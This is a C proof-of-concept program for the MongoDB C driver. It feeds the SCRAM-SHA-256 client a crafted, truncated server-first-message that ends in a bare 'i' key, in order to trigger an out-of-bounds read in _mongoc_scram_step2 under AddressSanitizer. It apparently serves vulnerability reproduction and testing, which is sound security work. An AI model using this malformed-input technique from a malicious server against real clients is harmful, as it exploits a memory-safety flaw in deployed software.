#include <mongoc/mongoc-crypto-private.h>
#include <mongoc/mongoc-scram-private.h>
#include <bson/bson.h>
#include <stdio.h>
#include <string.h>

int
main (void)
{
   mongoc_scram_t scram;
   uint8_t out_buf[4096] = {0};
   uint32_t out_buflen = 0;
   bson_error_t error;
   bool ok;

   memset (&scram, 0, sizeof (scram));

   /* Step 1: generate client-first-message so we get a real client nonce. */
   _mongoc_scram_init (&scram, MONGOC_CRYPTO_ALGORITHM_SHA_256);
   _mongoc_scram_set_user (&scram, "testuser");
   _mongoc_scram_set_pass (&scram, "testpass");

   ok = _mongoc_scram_step (&scram, out_buf, 0, out_buf, sizeof (out_buf), &out_buflen, &error);
   if (!ok) {
      fprintf (stderr, "step1 failed: %s\n", error.message);
      return 2;
   }
   printf ("step1 ok, client nonce = %.*s\n", scram.encoded_nonce_len, scram.encoded_nonce);

   /* Craft a "server-first-message" (attacker/malicious-server-controlled)
    * that is a well-formed, comma-separated r=/s=/i= message EXCEPT that it
    * is truncated to end immediately after a bare, unescaped key character
    * ('i') with no following "=value". This is the exact malformed input
    * the vulnerable parsing loop in _mongoc_scram_step2 (mongoc-scram.c)
    * mishandles: after recognizing the key char it unconditionally does
    * `ptr++; if (*ptr != '=') ...` without checking `ptr < inbuf+inbuflen`
    * first.
    *
    * Crucially: we heap-allocate the input buffer to EXACTLY inbuflen
    * bytes (no slack), unlike the real driver's call site in
    * mongoc-cluster.c which reuses an oversized 4096-byte stack buffer.
    * This is a fair test of the function's own bounds-safety contract: a
    * correct parser must not read past the length its caller told it
    * about, regardless of how much slack that particular caller happens
    * to provide.
    */
   const char *malicious = "r=";
   size_t base_len = strlen (malicious) + (size_t) scram.encoded_nonce_len;
   /* full message: "r=<nonce>,s=abcd,i" -- ends in bare 'i', no '=' */
   char *crafted = bson_malloc0 (base_len + 32);
   size_t n = 0;
   memcpy (crafted + n, malicious, strlen (malicious));
   n += strlen (malicious);
   memcpy (crafted + n, scram.encoded_nonce, (size_t) scram.encoded_nonce_len);
   n += (size_t) scram.encoded_nonce_len;
   const char *tail = ",s=YWJjZA==,i";
   memcpy (crafted + n, tail, strlen (tail));
   n += strlen (tail);
   /* n is now the exact malicious payload length; heap-allocate an
    * exactly-sized buffer (no extra slack) and copy it there. */
   uint8_t *inbuf = bson_malloc (n);
   memcpy (inbuf, crafted, n);
   bson_free (crafted);

   printf ("crafted server-first-message (%zu bytes): %.*s\n", n, (int) n, (char *) inbuf);

   scram.step = 1; /* pretend we already sent client-first-message */
   out_buflen = 0;
   memset (out_buf, 0, sizeof (out_buf));

   ok = _mongoc_scram_step (&scram, inbuf, (uint32_t) n, out_buf, sizeof (out_buf), &out_buflen, &error);

   printf ("step2 returned %d, error: %s\n", ok, ok ? "(none)" : error.message);

   bson_free (inbuf);
   _mongoc_scram_destroy (&scram);

   printf ("PoC completed without crashing (unexpected if ASan should have caught an OOB read)\n");
   return 0;
}
